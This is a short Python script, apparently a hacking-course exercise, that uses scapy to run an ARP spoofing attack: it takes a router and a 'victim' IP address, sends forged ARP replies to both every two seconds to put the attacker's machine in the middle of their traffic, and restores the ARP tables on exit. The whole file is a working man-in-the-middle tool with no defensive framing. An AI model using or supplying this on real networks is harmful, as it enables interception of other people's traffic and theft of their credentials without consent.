#!/usr/bin/env python3

import time
import scapy.all as scapy
from shared import arp_scan
import optparse


def get_parameters():
    parser = optparse.OptionParser()
    parser.add_option('-r', '--router', dest='router_ip', help='default gateway to spoof')
    parser.add_option('-v', '--victim', dest='victim_ip', help='victim to spoof')
    (options, arguments) = parser.parse_args()
    if not options.router_ip:
        parser.error('[-] router ip is required. use --help for more information')
    elif not options.victim_ip:
        parser.error('[-] victim ip is required. use --help for more information')
    return options


def spoof(target_ip, fake_ip):
    victim_mac = arp_scan(target_ip)[0][1].hwsrc
    victim_response = scapy.ARP(op=2,  psrc=fake_ip, hwdst=victim_mac, pdst=target_ip)
    scapy.send(victim_response, verbose=False)


def restore(source_ip, destination_ip):
    source_mac = arp_scan(source_ip)[0][1].hwsrc
    destination_mac = arp_scan(destination_ip)[0][1].hwsrc
    packet = scapy.ARP(op=2, psrc=source_ip, hwsrc=source_mac, pdst=destination_ip, hwdst=destination_mac)
    scapy.send(packet, verbose=False)


options = get_parameters()
router_ip = options.router_ip
victim_ip = options.victim_ip
packet_sent = 0
try:
    while True:
        spoof(victim_ip, router_ip)
        spoof(router_ip, victim_ip)
        packet_sent += 2
        print("\r[+] Packets sent: " + str(packet_sent), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Ctrl + c detected............. Quitting")
    restore(router_ip, victim_ip)
    restore(victim_ip, router_ip)